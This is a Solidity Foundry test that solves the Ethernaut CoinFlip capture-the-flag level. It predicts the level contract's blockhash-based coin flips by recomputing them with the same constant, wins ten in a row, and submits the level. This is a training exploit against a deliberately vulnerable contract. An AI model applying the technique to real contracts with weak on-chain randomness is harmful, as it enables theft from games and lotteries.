pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/3_CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for(uint i = 0; i < 10; i++) {
            vm.roll(10 + i * (FACTOR / 5));
            
            uint blockNumber = block.number;
            uint256 blockValue = uint256(blockhash(blockNumber - 1));
            bool side = (blockValue / FACTOR) == 1 ? true : false;
            ethernautCoinFlip.flip(side);

            emit log_named_uint("Block Number", blockNumber);
            emit log_named_uint("Block Value", blockValue);
            emit log_named_string("side", side ? "true" : "false");
            emit log_named_uint("After Consecutive wins", ethernautCoinFlip.consecutiveWins());
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}